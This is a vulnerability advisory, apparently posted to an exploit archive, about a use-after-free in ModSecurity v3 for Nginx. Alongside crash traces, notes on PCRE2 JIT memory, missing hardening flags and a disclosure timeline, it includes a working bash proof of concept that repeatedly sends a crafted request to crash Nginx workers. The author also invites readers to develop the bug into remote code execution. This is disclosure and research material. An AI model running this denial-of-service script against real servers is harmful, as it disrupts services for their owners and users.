@@ -1,0 +1,532 @@
+id: 30103
+date: 04/02/2018
+title: ModSecurity WAF 3.0 for Nginx - Denial of Service Vulnerability
+author: x ksi
+cves: 
+
+/*
+ * 1. Use-After-Free (UAF)
+ */
+
+During one of the engagements my team tested a WAF running in production
+Nginx + ModSecurity + OWASP Core Rule Set [1][2][3]. In the system logs I
+found information about the Nginx worker processes being terminated due to
+memory corruption errors.
+
+Through fuzzing and stress testing it was possible to obtain a minimised
+payload triggering the memory corruption. Further analysis revealed the v3
+branch of ModSecurity suffered from an UAF vulnerability. Unfortunately,
+all I managed to do with it was to cause a poor-man's remote DoS, perhaps
+others will have more luck exploiting it. Looking forward to read about it.
+
+The jaw dropping PoC:
+
+--
+$ cat > modsecngxdos.sh << EOF
+#!/bin/bash
+a="QlpoOTFBWSZTWZB0FmAAAAlfgAAQAQEQAEWAVAom%2f96UIABQxhMTJgJgACKHqYaj"
+a=\$a"EaYRk2pkZNlJnepN6k2L5PW8zntXMKxo5QpTgThzp3eBFqIXA0G5fxY3iA%2bYUj"
+a=\$a"8XckU4UJCQdBZg"
+b="GET / HTTP/1.1\r\nUser-Agent: grabber\r\nHost: \$a\r\n\r\n"
+if [ -z "\$1" ]; then
+  echo -e "\n \$0 <host> <port> [tls]\n"
+  echo ; exit
+elif [ ! -z "\$3" ]; then
+  c="openssl s_client -tls1 -no_ign_eof -quiet -connect \$1:\$2"
+else
+  c="nc \$1 \$2"
+fi; echo "Ctrl+C to abort..."
+while true; do
+  d=\$(echo -e \$b | \$c 2>/dev/null)
+  echo -n "!grab!"
+  if [ ! -z "\$d" ]; then
+    echo "Oh crap. Probably \$1 is not vulnerable. Better luck next time!"
+    exit
+  else
+    echo -n "poof!gone"
+  fi
+done
+EOF
+--
+
+The PoC was confirmed to work against the following combo setups:
+
+--
+ModSecurity v3/119a6fc07482096e8429399dc2d7c0d3f903a7ae
+CentOS 7.4.1708
+libpthread-2.17 [4]
+
+ModSecurity v3/5a32b389b49ebd0325a1ba81d7032593f8b9fb18
+Fedora 18
+libpthread-2.17
+
+ModSecurity v3/5a32b389b49ebd0325a1ba81d7032593f8b9fb18
+Ubuntu 14.04 LTS
+libpthread-2.19
+--
+
+GDB:
+
+--
+# gdb -p `pgrep nginx|tail -n1` /opt/nginx/nginx_vuln
+(gdb) continue
+Continuing.
+Program received signal SIGSEGV, Segmentation fault.
+0x00007f6a07632f4b in std::string::operator+=(char) () from
+/lib64/libstdc++.so.6
+(gdb) bt
+#0 0x00007f6a07632f4b in std::string::operator+=(char) () from
+/lib64/libstdc++.so.6
+#1 0x00007f6a079807ed in modsecurity::Rule::getFinalVars
+(this=this@entry=0x26962d0, trans=trans@entry=0x31f6430) at
+rule.cc:504
+#2 0x0007f6a07981972 in modsecurity::Rule::evaluate
+(this=this@entry=0x26962d0, trans=trans@entry=0x31f6430,
+ruleMessage=std::shared_ptr (count 1, weak 0) 0x32f5c70) at
+rule.cc:637
+#3 0x00007f6a079744a6 in modsecurity::Rules::evaluate (this=0x2618210,
+phase=phase@entry=6, transaction=transaction@entry=0x31f6430) at
+rules.cc:212
+#4 0x00007f6a0796210d in modsecurity::Transaction::processLogging
+(this=0x31f6430) at transaction.cc:1243
+#5 0x00007f6a079624b5 in modsecurity::msc_process_logging
+(transaction=<optimized out>) at transaction.cc:2101
+#6 0x00000000004918b8 in ngx_http_modsecurity_log_handler
+(r=<optimized out>) at
+/bla/ModSecurity-nginx/src/ngx_http_modsecurity_log.c:72
+#7 0x0000000000439690 in ngx_http_log_request (r=r@entry=0x260db60) at
+src/http/ngx_http_request.c:3109
+#8 0x0000000000439806 in ngx_http_free_request (r=r@entry=0x260db60,
+rc=rc@entry=0) at src/http/ngx_http_request.c:3064
+#9 0x00000000004399e3 in ngx_http_close_request (r=r@entry=0x260db60,
+rc=rc@entry=0) at src/http/ngx_http_request.c:3017
+#10 0x000000000043be5d in ngx_http_finalize_connection
+(r=r@entry=0x260db60) at src/http/ngx_http_request.c:2233
+#11 0x000000000043caa9 in ngx_http_finalize_request
+(r=r@entry=0x260db60, rc=<optimized out>, rc@entry=0) at
+src/http/ngx_http_request.c:2127
+#12 0x000000000044aea6 in ngx_http_upstream_finalize_request
+(r=r@entry=0x260db60, u=u@entry=0x323c600, rc=rc@entry=0) at
+src/http/ngx_http_upstream.c:3102
+#13 0x000000000044ba90 in ngx_http_upstream_process_request
+(r=r@entry=0x260db60) at src/http/ngx_http_upstream.c:2721
+#14 0x000000000044bb89 in ngx_http_upstream_process_upstream
+(r=r@entry=0x260db60, u=u@entry=0x323c600) at
+src/http/ngx_http_upstream.c:2655
+#15 0x000000000044d449 in ngx_http_upstream_send_response
+(u=0x323c600, r=0x260db60) at src/http/ngx_http_upstream.c:2348
+#16 0x000000000044d4d6 in ngx_http_upstream_process_header
+(r=0x260db60, u=0x323c600) at src/http/ngx_http_upstream.c:1644
+#17 0x000000000044bc07 in ngx_http_upstream_handler (ev=0x2fcd598) at
+src/http/ngx_http_upstream.c:935
+#18 0x0000000000427bfc in ngx_epoll_process_events (cycle=0x25f4960,
+timer=<optimized out>, flags=<optimized out>) at
+src/event/modules/ngx_epoll_module.c:683
+#19 0x000000000041eb3e in ngx_process_events_and_timers
+(cycle=cycle@entry=0x25f4960) at src/event/ngx_event.c:247
+#20 0x0000000000425d40 in ngx_worker_process_cycle (cycle=0x25f4960,
+data=<optimized out>) at src/os/unix/ngx_process_cycle.c:807
+#21 0x000000000042449f in ngx_spawn_process
+(cycle=cycle@entry=0x25f4960, proc=proc@entry=0x425c51
+<ngx_worker_process_cycle>, data=data@entry=0x0,
+name=name@entry=0x4965e6 "worker process", respawn=respawn@entry=-3)
+at src/os/unix/ngx_process.c:198
+#22 0x0000000000424fcd in ngx_start_worker_processes
+(cycle=cycle@entry=0x25f4960, n=1, type=type@entry=-3) at
+src/os/unix/ngx_process_cycle.c:362
+#23 0x000000000042664c in ngx_master_process_cycle
+(cycle=cycle@entry=0x25f4960) at src/os/unix/ngx_process_cycle.c:136
+#24 0x0000000000408eca in main (argc=<optimized out>, argv=<optimized
+out>) at src/core/nginx.c:412
+-- 
+
+ASAN:
+
+--
+==17348==ERROR: AddressSanitizer: heap-use-after-free on address
+0x60700011dce0 at pc 0x7f59f2baf935 bp 0x7ffe23c92e50 sp
+0x7ffe23c925f8
+READ of size 38 at 0x60700011dce0 thread T0
+    #0 0x7f59f2baf934 in __asan_memcpy
+(/usr/lib/x86_64-linux-gnu/libasan.so.2+0x8c934)
+    #1 0x7f59f21d7b36 in std::char_traits<char>::copy(char*, char
+const*, unsigned long) /usr/include/c++/5/bits/char_traits.h:290
+    #2 0x7f59f21d7b36 in std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> >::_S_copy(char*, char
+const*, unsigned long) /usr/include/c++/5/bits/basic_string.h:299
+    #3 0x7f59f21d7b36 in std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> >::_S_copy_chars(char*,
+char const*, char const*) /usr/include/c++/5/bits/basic_string.h:346
+    #4 0x7f59f21d7b36 in void std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> >::_M_construct<char
+const*>(char const*, char const*, std::forward_iterator_tag)
+/usr/include/c++/5/bits/basic_string.tcc:229
+    #5 0x7f59f21deddc in void std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char>
+
+    ::_M_construct_aux<char*>(char*, char*, std::__false_type)
+
+/usr/include/c++/5/bits/basic_string.h:195
+    #6 0x7f59f21deddc in void std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char>
+
+    ::_M_construct<char*>(char*, char*)
+
+/usr/include/c++/5/bits/basic_string.h:214
+    #7 0x7f59f21deddc in std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char>
+
+    ::basic_string(std::__cxx11::basic_string<char,
+
+std::char_traits<char>, std::allocator<char> > const&)
+/usr/include/c++/5/bits/basic_string.h:400
+    #8 0x7f59f21deddc in
+modsecurity::Rule::getFinalVars(modsecurity::Transaction*)
+/bla/src/ModSecurity/src/rule.cc:596
+    #9 0x7f59f21dfc1c in
+modsecurity::Rule::evaluate(modsecurity::Transaction*,
+std::shared_ptr<modsecurity::RuleMessage>)
+/bla/ModSecurity/src/rule.cc:728
+    #10 0x7f59f21d2646 in modsecurity::Rules::evaluate(int,
+modsecurity::Transaction*) /bla/src/ModSecurity/src/rules.cc:219
+    #11 0x7f59f21bde18 in
+modsecurity::Transaction::processRequestBody()
+/bla/src/ModSecurity/src/transaction.cc:803
+    #12 0x640d64 in ngx_http_modsecurity_pre_access_handler
+../ModSecurity-nginx/src/ngx_http_modsecurity_pre_access.c:199
+    #13 0x4de9e9 in ngx_http_core_generic_phase
+src/http/ngx_http_core_module.c:873
+    #14 0x4de818 in ngx_http_core_run_phases src/http/ngx_http_core_module.c:851
+    #15 0x4de6ce in ngx_http_handler src/http/ngx_http_core_module.c:834
+    #16 0x505583 in ngx_http_process_request src/http/ngx_http_request.c:1948
+    #17 0x502382 in ngx_http_process_request_headers
+src/http/ngx_http_request.c:1375
+    #18 0x5001d6 in ngx_http_process_request_line
+src/http/ngx_http_request.c:1048
+    #19 0x4fe67c in ngx_http_wait_request_handler
+src/http/ngx_http_request.c:506
+    #20 0x4c7083 in ngx_epoll_process_events
+src/event/modules/ngx_epoll_module.c:902
+    #21 0x4930a9 in ngx_process_events_and_timers src/event/ngx_event.c:242
+    #22 0x4bea2b in ngx_worker_process_cycle src/os/unix/ngx_process_cycle.c:750
+    #23 0x4b5756 in ngx_spawn_process src/os/unix/ngx_process.c:199
+    #24 0x4bdbf2 in ngx_reap_children src/os/unix/ngx_process_cycle.c:622
+    #25 0x4ba892 in ngx_master_process_cycle src/os/unix/ngx_process_cycle.c:175
+    #26 0x40e45a in main src/core/nginx.c:382
+    #27 0x7f59f189b82f in __libc_start_main
+(/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
+    #28 0x40d4f8 in _start (/usr/sbin/nginx+0x40d4f8)
+
+0x60700011dce0 is located 0 bytes inside of 69-byte region
+[0x60700011dce0,0x60700011dd25)
+freed by thread T0 here:
+    #0 0x7f59f2bbcb2a in operator delete(void*)
+(/usr/lib/x86_64-linux-gnu/libasan.so.2+0x99b2a)
+    #1 0x7f59f220eca8 in
+__gnu_cxx::new_allocator<char>::deallocate(char*, unsigned long)
+/usr/include/c++/5/ext/new_allocator.h:110
+    #2 0x7f59f220eca8 in std::allocator_traits<std::allocator<char>
+
+    ::deallocate(std::allocator<char>&, char*, unsigned long)
+
+/usr/include/c++/5/bits/alloc_traits.h:517
+    #3 0x7f59f220eca8 in std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> >::_M_destroy(unsigned
+long) /usr/include/c++/5/bits/basic_string.h:185
+    #4 0x7f59f220eca8 in std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> >::_M_dispose()
+/usr/include/c++/5/bits/basic_string.h:180
+    #5 0x7f59f220eca8 in std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> >::~basic_string()
+/usr/include/c++/5/bits/basic_string.h:543
+    #6 0x7f59f220eca8 in
+modsecurity::collection::Collection::resolveMultiMatches(std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> > const&,
+std::__cxx11::basic_string<char, std::char_traits<char>,
+std::allocator<char> >, std::vector<modsecurity::collection::Variable
+const*, std::allocator<modsecurity::collection::Variable const*> >*)
+../headers/modsecurity/collection/collection.h:102
+    #7 0x7f59f220eca8 in
+modsecurity::collection::Collections::resolveMultiMatches(std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> > const&,
+std::__cxx11::basic_string<char, std::char_traits<char>,
+std::allocator<char> > const&,
+std::vector<modsecurity::collection::Variable const*,
+std::allocator<modsecurity::collection::Variable const*> >*)
+collection/collections.cc:270
+    #8 0x7ffe23c92faf  (<unknown module>)
+
+previously allocated by thread T0 here:
+    #0 0x7f59f2bbc532 in operator new(unsigned long)
+(/usr/lib/x86_64-linux-gnu/libasan.so.2+0x99532)
+    #1 0x7f59f048b498 in std::__cxx11::basic_string<char,
+std::char_traits<char>, std::allocator<char> >::_M_mutate(unsigned
+long, unsigned long, char const*, unsigned long)
+(/usr/lib/x86_64-linux-gnu/libstdc++.so.6+0x11f498)
+--
+
+/*
+ * 2. The RWX memory mappings
+ */
+
+During the analysis I found that Nginx processes are using RWX memory
+mappings, upon further investigation it was revealed that those mapping
+were created by PCRE2 code which is heavily used in ModSecurity.
+
+The problem is that the PCRE2's JIT compiler (and DGC in general) in order
+to operate correctly requires RWX mapped memory, and because of this
+requirement the security of the code that uses PCRE2 can be impacted.
+
+This issue has been known for some time (although new to me) [5][6] with
+others trying to address it in one way or another [7][8][9][10][11] with
+varied degrees of success.
+
+Programmers who use PCRE2 can unknowingly introduce memory mappings with
+RWX permissions in their programs. This will make the exploitation process
+easier (e.g bypassing NX/DEP) or possible (i.e. circumventing CFI) for
+memory corruption vulnerabilities identified in these programs.
+
+The PCRE2's function responsible for creating the RWX mapping is defined in
+src/sljit/sljitExecAllocator.c [12]:
+
+   97 static SLJIT_INLINE void* alloc_chunk(sljit_uw size)
+   98 {
+   99   void *retval;
+  100
+  101 #ifdef MAP_ANON
+  102   retval = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
+MAP_PRIVATE | MAP_ANON, -1, 0);
+  103 #else
+  104   if (dev_zero < 0) {
+  105     if (open_dev_zero())
+  106       return NULL;
+  107   }
+  108   retval = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
+MAP_PRIVATE, dev_zero, 0);
+  109 #endif
+  110
+  111   return (retval != MAP_FAILED) ? retval : NULL;
+  112 }
+
+and is called in ModSecurity by pcre_study() function which is defined in
+src/utils/regex.cc [13]:
+
+ 41 Regex::Regex(const std::string& pattern_)
+ 42     : pattern(pattern_),
+ 43     m_ovector {0} {
+ 44     const char *errptr = NULL;
+ 45     int erroffset;
+ 46
+ 47     if (pattern.empty() == true) {
+ 48         pattern.assign(".*");
+ 49     }
+ 50
+ 51     m_pc = pcre_compile(pattern.c_str(), PCRE_DOTALL|PCRE_MULTILINE,
+ 52         &errptr, &erroffset, NULL);
+ 53
+ 54     m_pce = pcre_study(m_pc, pcre_study_opt, &errptr);
+ 55 }
+
+ModSecurity is not the only project that uses PCRE2 in this way
+[14][15][16][17][18].
+
+I have asked authors of the PCRE2 if there are any plans to introduce
+changes in the current implementation of JIT in that area and received the
+following reply from Zoltán Herczeg:
+
+--
+The problem is that OS-es do not provide better options. On-the-fly machine
+code generation requires writable and executable memory area. Although you
+can play with flipping the flags (set writable first / switch to executable
+later), that is unsafe as setting both, and SELinux does not allow even
+that. You can play with mapping temporary files (that works under SELinux),
+but that is ugly and unsafe as the other options. Anyway you can enable
+such allocator by passing -DSLJIT_PROT_EXECUTABLE_ALLOCATOR=1 to CFLAGS
+when compiling PCRE, and it works as long as the application does not call
+fork(). There is no notification for fork() under Linux, so it is
+impossible to tell in the original application that it was forked. Only the
+forked part get a new process id.
+
+On the long run, Linux (posix) should provide an API designed for JIT
+compilers. It can be safe if the OS does it. (...)  I don't think this
+issue can be solved without help from the OS. The currently available
+userland methods are inherently insecure.
+--
+
+The ModSecurity team also found this issue tricky to resolve because JIT
+provides a huge performance gain while processing regexes. If disabled, the
+processing performance could become an issue for users. To address the
+problem the team considered adding a compile time option for
+enabling/disabling JIT in the same way it was done in v2 branch [19].
+
+/*
+ * 3. Missing compile-time hardening options
+ */
+
+I found that in some distributions, by default during the ModSecurity
+compilation the hardening options are missing, e.g.:
+
+--
+# lsb_release -a
+LSB Version:
+:core-4.1-amd64:core-4.1-noarch:cxx-4.1-amd64:cxx-4.1-noarch:desktop-4.1-amd64:desktop-4.1-noarch:languages-4.1-amd64:languages-4.1-noarch:printing-4.1-amd64:printing-4.1-noarch
+Distributor ID: CentOS
+Description:    CentOS Linux release 7.4.1708 (Core)
+Release:        7.4.1708
+Codename:       Core
+
+# gdb ./libmodsecurity.so.3.0.0
+GNU gdb (GDB) Red Hat Enterprise Linux 7.6.1-100.el7_4.1
+gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : ENABLED
+PIE       : Dynamic Shared Object
+RELRO     : Partial
+--
+
+The ModSecurity team considered updating the official documentation so it
+suggests to users that they should set '-fstack-protector-all' and
+'-D_FORTIFY_SOURCE=2' options at compile time. It was noted that enabling
+these could have a potential performance penalty. Trustwave would have to
+further investigate in order to determine what, if any, negative impact
+this would have.
+
+Additionally, Trustwave considered reaching out to a distro package
+maintainers and suggest them to enable the aforementioned flags for
+ModSecurity binary packages.
+
+/*
+ * 4. Remediation
+ */
+
+- Update ModSecurity v3 to its most recent version.
+- Contact vendor for more details.
+
+/*
+ * 5. Closing word
+ */
+
+Feel free to correct me if you know or think that I'm wrong on anything
+which has been described here, as it will only assist others.
+
+I would appreciate if someone could point me to any prior work (e.g.
+exploits/advisories/articles/ctf challs) treating about leveraging JIT/DGC
+to bypass CFI (e.g. Control Flow Guard by MS or RAP by PaX).
+
+The analysis of UAF showed that in order to end up with a vulnerable setup
+a substantial number of requirements needs to be met, which could lead
+people to presume that finding this kind of issue in the wild is close to
+zero. However, life showed (yet again) that vulnerable instances running in
+a production environment actually exist.
+
+Perhaps, it is you who will give this UAF a try, analyse it further and
+exploit it to obtain RCE. It should be more fun and a better learning
+experience than many artificial CTF challenges.
+
+Trustwave has been contacted and after performing an analysis the team came
+to the conclusion that the UAF affects only a non-release version(s) of
+ModSecurity. In Trustwave's opinion there is no need to release official
+information about this bug and notify users.
+
+I wonder if we are going to see more cases similar to this one in the near
+future. A "non-release" code that ends up in the production due to a
+spreading SecDevOps's culture.  Organisations now build and push code
+insanely fast.  Automating 'git clone ...' and pushing the code through all
+stages up to production is easy, however, somewhere in the whole CI/DI
+pipeline there should be some mechanism(s) that will perform verification
+and determine if the code version/release which is going to be used is
+actually production ready.  This, on the other hand, is a story for another
+time.
+
+/*
+ * 6. Timeline:
+ */
+
+24.01.2018: Initial contact email sent to security () modsecurity org asking
+            about the process of reporting security related issues in
+            ModSecurity.
+06.02.2018: No vendor response. Contacting security () modsecurity org,
+            fcosta () trustwave com and vhora () trustwave com with brief
+            information about the defect and asked about the process of
+            reporting security related issues in ModSecurity.
+07.02.2018: Vendor provided information about the reporting process and
+            asked for more details.
+10.02.2018: Additional information and defect analysis provided to the
+            vendor.
+14.02.2018: No vendor response. Request for a status update.
+15.02.2018: Vendor informs the analysis is in progress.
+16.02.2018: Vendor informs they're not able to reproduce the issue based on
+            the provided information.
+16.02.2018: Additional information provided to the vendor.
+17.02.2018: Vendor informs they're not able to reproduce the issue based on
+            the provided information.
+17.02.2018: Additional information provided to the vendor including an OVA
+            VM image.
+22.02.2018: Vendor confirms they were able to reproduce the issue and
+            requests additional information.
+22.02.2018: Additional information provided to the vendor.
+16.03.2018: No vendor response. Request for a status update and notifying
+            vendor about the planned advisory release.
+16.03.2018: Vendor confirms issue doesn't happen on the stable release
+            version, but more specifically on some development versions.
+16.03.2018: Vendor concludes the analysis and provides the following
+            response:
+
+We had a fix of invalid variable references which were leading to crashes
+on some scenarios. This was fixed on development commit
+v3/003a8e8e5f33f4bbbc0e8c349b25faec74bb0440.  We also confirmed that the
+RC1 version (v3/a2427df27f482c64ea8666dca9552c67d3a68904) that came out a
+few days later is not vulnerable to this issue.  The crash happening on
+Nginx with development commit v3/119a6fc07482096e8429399dc2d7c0d3f903a7ae
+(the one that we managed to reproduce from your OVA) was due to a test
+(hence why its named "test-only: Placing a mutex while evaluating the pm
+operator") and it was changed at the same time with commits
+v3/7d786b335024f2c896eb30830427c54f28dcc44c and
+v3/1c91e807778f826b20d45abcef9a204e8f313d01 which followed the first one
+with a few seconds of difference (see git log). They came from a different
+branch and were merged together so in essence they are all part of the same
+code change.  As those issues didn't happened on any of the release
+versions (v3.0.0-rc1/v3.0.1) and we confirmed that the issue is fixed since
+commit v3/1c91e807778f826b20d45abcef9a204e8f313d01 we believe that a notice
+on a bug from a development version is not really necessary at this moment.
+We are open to hear your thoughts otherwise.
+
+20.03.2018: Advisory draft sent to the vendor for review along with
+            information about the planned release on 22.03.2018.
+23.03.2018: The advisory is released.
+
+/*
+ * 7 Acknowledgments
+ */
+
+- Victor Hora (Trustwave)
+- Gregory Nimmo and Alex Dib (Telstra)
+- Telstra BTS Security Services (redteamnsw () team telstra com)
+
+/*
+ * 8. References
+ */
+
+[1] https://nginx.org/download/nginx-1.13.8.tar.gz
+[2] https://github.com/SpiderLabs/ModSecurity
+[3] https://github.com/SpiderLabs/owasp-modsecurity-crs
+[4] https://bugzilla.redhat.com/show_bug.cgi?id=1146967
+[5] https://en.wikipedia.org/wiki/Just-in-time_compilation#Security
+[6] https://en.wikipedia.org/wiki/JIT_spraying
+[7] https://pax.grsecurity.net/docs/mprotect.txt
+[8] https://undeadly.org/cgi?action=article&sid=20160527203200
+[9] https://www.tedunangst.com/flak/post/now-or-never-exec
+[10] https://jandemooij.nl/blog/2015/12/29/wx-jit-code-enabled-in-firefox/
+[11] http://wenke.gtisc.gatech.edu/papers/sdcg.pdf
+[12] https://vcs.pcre.org/pcre2/code/trunk/src/sljit/sljitExecAllocator.c?view=markup#97
+[13] https://github.com/SpiderLabs/ModSecurity/blob/v3/master/src/utils/regex.cc#L41
+[14] 
+https://git.haproxy.org/?p=haproxy-1.8.git;a=blob;f=src/regex.c;h=62c8e84df9e8b122dad61b44bebd70f885de6711;hb=1deb90d5243a5cfa5da7592978592eb9ab2c8c6f#l358
+[15] https://github.com/unbit/uwsgi/blob/master/core/regexp.c#L29
+[16] https://github.com/varnishcache/varnish-cache/blob/master/lib/libvarnish/vre.c#L86
+[17] https://github.com/nginx/nginx/blob/008e9caa2a5b784d337422f1dc4290edfb9cc640/src/core/ngx_regex.c#L341
+[18] https://github.com/php/php-src/blob/PHP-7.1.14/ext/pcre/php_pcre.c#L542
+[19] https://github.com/SpiderLabs/ModSecurity/blob/v2/master/configure.ac#L328
+
+#  0day.today [2023-03-26]  #
